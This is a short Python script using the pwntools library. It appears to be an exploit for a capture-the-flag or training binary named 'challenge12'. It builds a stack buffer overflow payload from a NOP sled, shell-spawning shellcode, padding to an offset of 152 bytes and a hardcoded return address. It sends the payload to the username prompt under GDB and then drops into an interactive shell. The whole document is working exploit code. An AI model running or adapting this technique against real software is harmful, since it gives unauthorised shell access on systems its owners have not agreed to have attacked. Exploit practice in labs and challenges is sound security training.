from pwn import *
context.arch='amd64'

def makeExploit(offset, ret_addr, buf_size=128):
    shellcode = asm(shellcraft.amd64.sh())
    exploit = b"\x90" * (buf_size - len(shellcode))
    exploit += shellcode
    exploit += b"A" * (offset - len(exploit))
    exploit += ret_addr
    return exploit

def makeProcess():
    io = process("./challenge12")
    try:
        gdb.attach(io, '''c''')
    except:
        print("Start tmux first!")
        exit(1)
    return io


io = makeProcess()
exploit = makeExploit(152, b"\xf0\xe7\xff\xff\xff\x7f")

print("Sending exploit:")
print(hexdump(exploit, skip=False))

io.sendafter(b"Username: ", exploit)
io.sendafter(b"Password: ", b'password')

# if there is a shell spawned, interact with it
# if not, wait for the process/GDB to exit
io.interactive()
